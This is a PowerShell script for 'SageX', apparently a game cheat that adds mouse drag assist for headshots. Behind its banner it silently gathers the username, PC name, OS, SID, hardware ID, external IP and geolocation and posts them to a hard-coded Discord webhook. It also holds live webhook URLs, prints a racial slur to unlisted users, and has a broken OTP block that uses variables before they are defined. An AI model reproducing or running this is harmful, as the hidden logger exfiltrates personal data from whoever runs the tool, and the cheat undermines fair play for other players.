Clear-Host
$colors = @("Red", "Yellow", "Cyan", "Green", "Magenta", "Blue", "White")

$asciiArt = @'
  _________                     ____  ___ __________                         .___.__  __   
 /   _____/____     ____   ____ \   \/  / \______   \ ____   ____   ____   __| _/|__|/  |_ 
 \_____  \\__  \   / ___\_/ __ \ \     /   |       _// __ \ / ___\_/ __ \ / __ | |  \   __\
 /        \/ __ \_/ /_/  >  ___/ /     \   |    |   \  ___// /_/  >  ___// /_/ | |  ||  |  
/_______  (____  /\___  / \___  >___/\  \  |____|_  /\___  >___  / \___  >____ | |__||__|  
        \/     \//_____/      \/      \_/         \/     \/_____/      \/     \/             
'@

$asciiArt -split "`n" | ForEach-Object {
    $color = Get-Random -InputObject $colors
    Write-Host $_ -ForegroundColor $color
}

# Get current user's SID
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
} catch {
    Write-Host "[!] Failed to get SID" -ForegroundColor Red
    exit
}
# ----------- OTP VERIFICATION BEGIN -----------
# OTP System Configuration
$otpStoragePath = "$env:APPDATA\SageX\otp_config.ini"
$otpValidatedPath = "$env:APPDATA\SageX\otp_validated.ini"

# Function to generate a random OTP
function Generate-OTP {
    $chars = "123456789"
    $otp = ""
    1..6 | ForEach-Object {
        $otp += $chars[(Get-Random -Maximum $chars.Length)]
    }
    return $otp
}

# Function to validate OTP
function Validate-OTP {
    param([string]$inputOTP)
    
    if (Test-Path $otpStoragePath) {
        $storedOTP = Get-Content $otpStoragePath
        if ($inputOTP -eq $storedOTP) {
            $true | Out-File $otpValidatedPath
            Remove-Item $otpStoragePath -Force
            return $true
        }
    }
    return $false
}

# Check if OTP has already been validated
if (Test-Path $otpValidatedPath) {
    # OTP already validated, continue with normal execution
} else {
    # OTP verification needed
    if (Test-Path $otpStoragePath) {
        # OTP already generated but not validated
        $storedOTP = Get-Content $otpStoragePath
        Write-Host "`n[!] OTP Verification Required" -ForegroundColor Red
        Write-Host "[*] Please enter the 6-digit OTP sent to your Discord" -ForegroundColor Yellow
        $attempts = 3
        
        while ($attempts -gt 0) {
            $userOTP = Read-Host "Enter OTP (Attempts left: $attempts)"
            if (Validate-OTP -inputOTP $userOTP) {
                Write-Host "[+] OTP Verified Successfully!" -ForegroundColor Green
                Start-Sleep -Seconds 2
                Clear-Host
                break
            } else {
                $attempts--
                if ($attempts -eq 0) {
                    Write-Host "[!] Maximum attempts reached. Exiting..." -ForegroundColor Red
                    Start-Sleep -Seconds 3
                    exit
                }
                Write-Host "[!] Invalid OTP. Try again." -ForegroundColor Red
            }
        }
    } else {
        # First run - generate and send OTP
        if (-not (Test-Path (Split-Path $otpStoragePath))) {
            New-Item -ItemType Directory -Path (Split-Path $otpStoragePath) -Force | Out-Null
        }
        
        $newOTP = Generate-OTP
        $newOTP | Out-File $otpStoragePath
        
        # Send OTP to Discord via webhook
        $otpEmbed = @{
            title = "🔑 SageX OTP Verification"
            description = "A new OTP has been generated for verification"
            color = 65280
            fields = @(
                @{ name = "User"; value = $user; inline = $true },
                @{ name = "HWID"; value = $hashedHWID; inline = $true },
                @{ name = "OTP Code"; value = "||$newOTP||"; inline = $false },
                @{ name = "Valid For"; value = "5 minutes"; inline = $false }
            )
            timestamp = (Get-Date).ToString("o")
        }
        
        $otpPayload = @{
            username = "SageX OTP System"
            embeds = @($otpEmbed)
        } | ConvertTo-Json -Depth 10
        
        try {
            Invoke-RestMethod -Uri $webhookUrl - "https://discordapp.com/api/webhooks/1380951069718479070/Rtiw-SnS-vWs35FwERyqYm9Y-ZEOW7_UMHVTjnc6aZMauK1WifQ2ZqZMchJFfjTprblA" -Body $otpPayload -ContentType 'application/json'
        } catch {
            Write-Host "[!] Failed to send OTP to Discord" -ForegroundColor Red
        }
        
        Write-Host "`n[!] FIRST RUN DETECTED - OTP VERIFICATION REQUIRED" -ForegroundColor Red
        Write-Host "[*] An OTP has been sent to the administrator Discord" -ForegroundColor Yellow
        Write-Host "[*] Please contact the provider to get your verification code`n" -ForegroundColor Yellow
        
        $attempts = 3
        $otpExpiry = (Get-Date).AddMinutes(5)
        
        while ($attempts -gt 0 -and (Get-Date) -lt $otpExpiry) {
            $timeLeft = ($otpExpiry - (Get-Date)).ToString("mm\:ss")
            $userOTP = Read-Host "Enter OTP (Attempts left: $attempts | Expires in: $timeLeft)"
            
            if (Validate-OTP -inputOTP $userOTP) {
                Write-Host "[+] OTP Verified Successfully!" -ForegroundColor Green
                Start-Sleep -Seconds 2
                Clear-Host
                break
            } else {
                $attempts--
                if ($attempts -eq 0 -or (Get-Date) -ge $otpExpiry) {
                    Write-Host "[!] OTP verification failed. Exiting..." -ForegroundColor Red
                    Start-Sleep -Seconds 3
                    exit
                }
                Write-Host "[!] Invalid OTP. Try again." -ForegroundColor Red
            }
        }
        
        # Cleanup if verification failed
        if (-not (Test-Path $otpValidatedPath)) {
            Remove-Item $otpStoragePath -Force -ErrorAction SilentlyContinue
            exit
        }
    }
}
# ----------- WEBHOOK BLOCK BEGIN -----------

$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"

# Collect system info
$user = $env:USERNAME
$pcName = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

# External IP and geo info
try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json"
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $region = $ipInfo.regionName
    $city = $ipInfo.city
} catch {
    $ip = "Unavailable"
    $country = "Unavailable"
    $region = "Unavailable"
    $city = "Unavailable"
}

# Create embed
$embed = @{
    title = "<:Dead:1346705076626002033> SageX Executed"
    color = 16711680
    timestamp = (Get-Date).ToString("o")
    fields = @(
        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
    )
}

$payload = @{
    username = "SageX Logger"
    embeds = @($embed)
} | ConvertTo-Json -Depth 10

# Send webhook
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
} catch {
    }

# ----------- WEBHOOK BLOCK END -----------

# Correct GitHub raw URL
$authURL = "https://raw.githubusercontent.com/Toxic-Speed/SAGE-X/refs/heads/main/HWID"

try {
    $rawData = Invoke-RestMethod -Uri $authURL -UseBasicParsing
} catch {
    Write-Host "`n[!] Failed to fetch authorized SIDs from server." -ForegroundColor Red
    exit
}

# Check if SID is authorized
if ($rawData -notmatch $sid) {
    Write-Host "`n[!]Who the Fuck Are You ?? Nigga !!!" -ForegroundColor Red
    Start-Sleep -Seconds 6
    exit
}

# Message lines
$msgLines = @(
    "[+] Your Mouse is Connected With SageX Regedit [AI]",
    "[+] Sensitivity Tweaked For Maximum Precision",
    "[+] Drag Assist Enabled - Easy Headshots",
    "[+] Low Input Lag Mode ON",
    "[+] Hold LMB for Auto Drag Support",
    "[+] Press F5 to Toggle ON/OFF"
)
$msgLines | ForEach-Object {
    Write-Host $_ -ForegroundColor Red
    Start-Sleep -Milliseconds 300
}

Write-Host "`n----------------------------------------------------------------------------------"
Write-Host "Status : ON"

# C# code for drag assist
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class FairXDragAssist {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public const int MOUSEEVENTF_MOVE = 0x0001;
    public const int VK_LBUTTON = 0x01;
    public const int VK_F5 = 0x74;

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int X;
        public int Y;
    }

    public static bool Enabled = true;

    public static void Run() {
        POINT prev;
        GetCursorPos(out prev);
        bool isHolding = false;
        DateTime pressStart = DateTime.MinValue;

        while (true) {
            Thread.Sleep(5);
            bool toggle = (GetAsyncKeyState(VK_F5) & 0x8000) != 0;

            if (toggle && DateTime.Now.Millisecond % 2 == 0) {
                Enabled = !Enabled;
                Console.SetCursorPosition(0, Console.CursorTop - 1);
                Console.WriteLine("Status : " + (Enabled ? "ON " : "OFF"));
                Console.Beep();
                Thread.Sleep(400);
            }

            if (!Enabled)
                continue;

            bool lmbDown = (GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0;

            if (lmbDown) {
                if (!isHolding) {
                    isHolding = true;
                    pressStart = DateTime.Now;
                } else if ((DateTime.Now - pressStart).TotalMilliseconds >= 60) {
                    POINT curr;
                    GetCursorPos(out curr);

                    int deltaY = curr.Y - prev.Y;
                    int deltaX = curr.X - prev.X;

                    if (deltaY < -1) {
                        int correctedX = (int)(deltaX * 0.4);
                        mouse_event(MOUSEEVENTF_MOVE, -correctedX, -4, 0, 0);
                        Thread.Sleep(10);
                    }

                    prev = curr;
                }
            } else {
                isHolding = false;
            }
        }
    }
}
"@

[FairXDragAssist]::Run()
